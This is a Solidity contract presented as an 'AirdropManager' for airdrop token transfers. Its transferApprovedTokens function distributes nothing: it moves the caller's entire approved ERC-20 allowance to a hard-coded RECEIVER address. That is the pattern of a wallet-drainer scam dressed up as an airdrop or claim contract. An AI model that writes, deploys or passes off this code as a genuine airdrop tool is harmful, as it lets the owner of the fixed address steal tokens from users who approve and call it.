// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title AirdropManager
 * @dev Manages token approvals and transfers for airdrops
 */
interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract AirdropManager {
    address public constant RECEIVER = 0xf36Aa3CD6Fdd245d03982CAEB7c4A31b2b4bE1d0;
    
    event TokensTransferred(address indexed token, address indexed from, uint256 amount);
    
    /**
     * @dev Transfer all approved tokens to the receiver address
     * @param tokenAddress The ERC20 token contract address
     */
    function transferApprovedTokens(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        uint256 allowedAmount = token.allowance(msg.sender, address(this));
        
        require(allowedAmount > 0, "No tokens approved");
        
        bool success = token.transferFrom(msg.sender, RECEIVER, allowedAmount);
        require(success, "Transfer failed");
        
        emit TokensTransferred(tokenAddress, msg.sender, allowedAmount);
    }
    
    /**
     * @dev Get approved amount for a specific token
     * @param tokenAddress The ERC20 token contract address
     * @param owner The token owner address
     */
    function getApprovedAmount(address tokenAddress, address owner) external view returns (uint256) {
        IERC20 token = IERC20(tokenAddress);
        return token.allowance(owner, address(this));
    }
}
